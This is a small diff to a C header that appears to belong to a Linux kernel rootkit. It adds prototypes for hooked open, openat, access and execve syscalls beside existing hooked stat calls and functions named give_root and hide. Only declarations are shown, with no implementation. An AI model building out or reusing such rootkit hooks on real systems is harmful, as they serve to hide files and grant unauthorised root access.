@@ -26,6 +26,14 @@ asmlinkage int hacked_stat(const char *path, struct stat *buf);
 
 asmlinkage int hacked_lstat(const char *path, struct stat *buf);
 
+asmlinkage int hacked_open(const char* pathname, int flags, mode_t mode);
+
+asmlinkage int hacked_openat(int dirfd, const char *pathname, int flags, mode_t mode);
+
+asmlinkage int hacked_access(const char* pathname, int mode);
+
+asmlinkage int hacked_execve(const char* pathname, char* const argv[], char* const envp[]);
+
 void give_root(void);
 
 void hide(void);
